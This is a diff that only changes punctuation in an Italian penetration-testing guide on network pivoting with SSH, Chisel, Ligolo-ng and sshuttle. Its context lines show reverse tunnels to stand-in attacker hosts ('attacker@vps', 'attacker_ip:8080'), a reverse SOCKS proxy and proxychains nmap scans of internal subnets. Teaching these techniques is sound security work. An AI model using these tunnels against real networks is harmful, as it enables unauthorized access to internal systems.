@@ -34,7 +34,7 @@ proxychains curl http://192.168.1.100/admin
 ssh -R 4444:localhost:4444 attacker@vps
 ```
 
-## Chisel — tunneling via HTTP
+## Chisel: tunneling via HTTP
 
 Chisel crea tunnel TCP/UDP over HTTP, utile quando SSH è bloccato ma HTTP no:
 
@@ -49,7 +49,7 @@ chisel client attacker_ip:8080 R:socks
 proxychains nmap -sT -Pn 192.168.1.0/24
 ```
 
-## Ligolo-ng — tunneling di livello 3
+## Ligolo-ng: tunneling di livello 3
 
 Ligolo-ng è il tool più moderno: crea una vera interfaccia TUN, il traffico non passa per proxychains ed è molto più veloce.
 
@@ -67,9 +67,9 @@ Ligolo-ng è il tool più moderno: crea una vera interfaccia TUN, il traffico no
 sudo ip route add 192.168.1.0/24 dev ligolo
 ```
 
-Ora tutto il traffico verso `192.168.1.0/24` passa automaticamente attraverso il pivot — nmap, metasploit, browser, tutto.
+Ora tutto il traffico verso `192.168.1.0/24` passa automaticamente attraverso il pivot, nmap, metasploit, browser, tutto.
 
-## sshuttle — VPN over SSH
+## sshuttle: VPN over SSH
 
 sshuttle è il più facile da usare se si ha SSH:
 
